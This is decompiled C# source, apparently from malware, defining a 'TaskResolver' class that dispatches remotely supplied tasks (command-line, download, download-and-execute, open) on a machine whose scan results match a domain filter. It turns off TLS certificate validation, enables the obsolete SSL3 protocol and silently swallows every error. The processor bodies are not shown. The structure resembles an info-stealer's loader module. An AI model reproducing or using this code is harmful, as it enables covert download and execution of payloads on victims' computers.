using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

// Token: 0x02000036 RID: 54
public class TaskResolver
{
	// Token: 0x0600011C RID: 284 RVA: 0x0000A5B4 File Offset: 0x000087B4
	public TaskResolver(ScanResult result)
	{
		this.Result = result;
		this.TaskProcessors = new List<ITaskProcessor>
		{
			new CommandLineUpdate(),
			new DownloadUpdate(),
			new DownloadAndExecuteUpdate(),
			new OpenUpdate()
		};
		try
		{
			try
			{
				ServicePointManager.SecurityProtocol |= (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12);
			}
			catch
			{
			}
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
		}
		catch
		{
		}
	}

	// Token: 0x17000007 RID: 7
	// (get) Token: 0x0600011D RID: 285 RVA: 0x00003B7B File Offset: 0x00001D7B
	public List<ITaskProcessor> TaskProcessors { get; }

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x0600011E RID: 286 RVA: 0x00003B83 File Offset: 0x00001D83
	public ScanResult Result { get; }

	// Token: 0x0600011F RID: 287 RVA: 0x0000A670 File Offset: 0x00008870
	public List<int> ReleaseUpdates(IEnumerable<UpdateTask> tasks)
	{
		List<int> list = new List<int>();
		try
		{
			foreach (UpdateTask updateTask in tasks)
			{
				if (this.Result.ContainsDomains(updateTask.DomainFilter))
				{
					foreach (ITaskProcessor taskProcessor in this.TaskProcessors)
					{
						if (taskProcessor.IsValidAction(updateTask.Action) && taskProcessor.Process(updateTask))
						{
							list.Add(updateTask.TaskID);
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
